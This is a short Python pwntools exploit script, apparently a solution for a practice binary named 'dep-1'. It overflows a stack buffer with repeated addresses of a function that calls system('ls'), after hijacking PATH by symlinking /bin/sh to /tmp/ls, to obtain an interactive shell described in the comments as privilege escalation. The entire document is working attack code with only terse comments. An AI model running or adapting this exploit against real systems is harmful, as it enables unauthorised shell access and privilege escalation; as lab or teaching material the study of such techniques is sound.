from pwn import *
import os

# GDB says buffer starts at ebp - 0x88
# GDB says some_function at 0x08048553
# some_function calls system("ls")
# privillage escalation is given for free
# change ls to be /bin/sh by
# cp /bin/sh /tmp/ls
# export PATH=/tmp:$PATH

e = ELF('./dep-1')
somefunction_addr = e.symbols['some_function']

os.environ["PATH"] = "/tmp:" + os.environ["PATH"]
os.symlink("//bin/sh", "/tmp/ls")

p = process("./dep-1")
inp = 100 * p32(somefunction_addr)
p.sendline(inp)
p.interactive()

os.remove("/tmp/ls")


quit()
